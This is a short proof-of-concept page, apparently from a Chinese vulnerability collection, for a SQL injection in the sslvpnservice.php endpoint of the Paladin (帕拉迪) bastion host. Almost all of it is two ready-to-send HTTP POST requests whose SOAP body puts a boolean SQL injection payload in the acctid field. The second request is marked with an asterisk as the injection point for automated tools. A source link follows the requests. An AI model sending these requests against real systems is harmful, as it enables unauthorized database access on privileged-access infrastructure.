# 帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

## poc

```javascript
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>
```

```javascript
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1*,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>
```



## 漏洞来源

- https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww